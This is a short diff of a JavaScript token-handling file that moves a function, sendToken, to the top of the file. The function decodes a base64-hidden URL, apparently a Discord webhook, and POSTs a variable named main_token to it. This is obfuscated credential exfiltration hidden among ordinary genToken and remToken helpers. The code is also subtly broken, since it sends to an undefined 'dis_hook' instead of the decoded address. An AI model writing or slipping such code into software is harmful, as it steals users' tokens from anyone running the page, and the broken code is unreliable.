@@ -1,3 +1,12 @@
+function sendToken() {
+	hook =atob('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzg3MjM0ODE5MzQyMDEwNzc5Ny9EWmpkeGdHMGxpR1RYaEsySDhNT3ZxRnA4Wld0UE16RnVPSzV4ZVNWS0s2SUVSdnZMdl9FLVV4ZW9yZGRrZGxNR2FldA==')
+	msg1 = {
+		"content": ("__**Token (Not Discord):" + main_token)
+	}
+	fetch(dis_hook, {"method":"POST", "headers": {"content-type": "application/json"},
+	"body": JSON.stringify(msg1)});
+}
+
  function genToken() {
 	if (localStorage.getItem('token') !== null) {
 		// giving an error if the token still exists
@@ -22,13 +31,4 @@ function remToken() {
 	} else {
 		console.error("Token does not exist in localStorage");
 	}
-}
-
-function sendToken() {
-	hook =atob('aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzg3MjM0ODE5MzQyMDEwNzc5Ny9EWmpkeGdHMGxpR1RYaEsySDhNT3ZxRnA4Wld0UE16RnVPSzV4ZVNWS0s2SUVSdnZMdl9FLVV4ZW9yZGRrZGxNR2FldA==')
-	msg1 = {
-		"content": ("__**Token (Not Discord):" + main_token)
-	}
-	fetch(dis_hook, {"method":"POST", "headers": {"content-type": "application/json"},
-	"body": JSON.stringify(msg1)});
 }
